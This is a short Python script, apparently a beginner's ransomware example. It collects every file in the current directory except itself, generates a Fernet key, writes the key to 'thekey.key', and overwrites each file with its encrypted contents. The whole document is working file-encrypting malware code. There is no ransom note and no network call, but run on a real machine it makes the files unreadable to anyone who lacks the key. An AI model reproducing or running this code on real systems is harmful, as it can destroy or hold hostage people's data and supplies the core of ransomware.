#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet


files=[]

for file in os.listdir():
	if file =="important.py":
		continue

	if os.path.isfile(file):
		files.append(file)

print(files)


key=Fernet.generate_key()

with open("thekey.key","wb") as thekey:
	thekey.write(key)



for file in files:
	with open(file, "rb") as thefile:
		content= thefile.read()
	contents= Fernet(key).encrypt(content)
	with open(file, "wb") as thefile:
		thefile.write(contents)

